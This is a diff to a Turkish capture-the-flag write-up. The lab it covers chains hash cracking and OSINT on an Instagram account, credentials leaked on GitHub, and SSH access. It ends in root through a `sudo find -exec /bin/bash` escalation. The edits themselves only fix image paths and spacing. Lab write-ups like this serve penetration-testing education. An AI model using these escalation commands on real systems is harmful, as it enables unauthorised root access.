@@ -1,6 +1,7 @@
 # CTF Write-Up: FullPwn
 
 ## Senaryo
+
 Bu CTF senaryosunda, başlangıçta bir **Instagram hesabı** ve bir **IP adresi** verilmektedir.
 Katılımcıların Instagram hesabında paylaşılan postlarda bulunan hashleri çözerek flagi elde etmeleri gerekmektedir.
 
@@ -21,7 +22,7 @@ Katılımcıların Instagram hesabında paylaşılan postlarda bulunan hashleri 
 
 Instagram biyografisinde bir **GitHub linki** bulunmaktadır. Bu link takip edilerek, içinde **kullanıcı adı ve şifre** bulunan bir dosya tespit edilmelidir.
 
-![image](eray-fullpwn/github.png)
+![image](./github.png)
 
 ---
 
@@ -35,7 +36,7 @@ ssh username@IP_ADRESİ
 
 Bağlantı sağlandıktan sonra **user flag** elde edilecektir.
 
-![image](eray-fullpwn/user.png)
+![image](./user.png)
 
 ---
 
@@ -44,37 +45,43 @@ Bağlantı sağlandıktan sonra **user flag** elde edilecektir.
 Sisteme girdikten sonra, root yetkilerini almak için aşağıdaki adımlar takip edilmelidir.
 
 ### 4.1. Sudo Yetkilerini Kontrol Etme
+
 ```bash
 sudo -l
 ```
+
 Bu komut çalıştırıldığında **find** komutunun sudo yetkileri ile çalıştırılabileceği görülecektir.
 
 ### 4.2. SUID Bayrağı Olan Dosyaları Bulma
+
 ```bash
 find / -type f -perm -4000
 ```
+
 Bu komut, sistemde SUID (Set User ID) bitine sahip dosyaları listeler.
 
 ### 4.3. Find Komutunu Kullanarak Root Yetkisi Almak
+
 ```bash
 sudo find / -type f -perm -4000 -exec /bin/bash \;
 ```
+
 Bu komut, root yetkileriyle bash kabuğunu açarak root erişimi sağlamaktadır.
 
-![image](eray-fullpwn/root.png)
+![image](./root.png)
 
 ---
 
 ## 5. Root Flag'i Bulma
+
 ```bash
 cat /root/root_flag.txt
 ```
+
 Bu komut ile **root flag** elde edilir.
-
-
 
 ---
 
 ## Sonuç
-Bu CTF, temel olarak **hash çözme, OSINT teknikleri, SSH erişimi ve privilege escalation (yetki yükseltme)** adımlarını içermektedir. Başarıyla tamamlayan katılımcılar, temel Linux yeteneklerini ve sızma testi tekniklerini öğrenmiş olacaklardır.
 
+Bu CTF, temel olarak **hash çözme, OSINT teknikleri, SSH erişimi ve privilege escalation (yetki yükseltme)** adımlarını içermektedir. Başarıyla tamamlayan katılımcılar, temel Linux yeteneklerini ve sızma testi tekniklerini öğrenmiş olacaklardır.
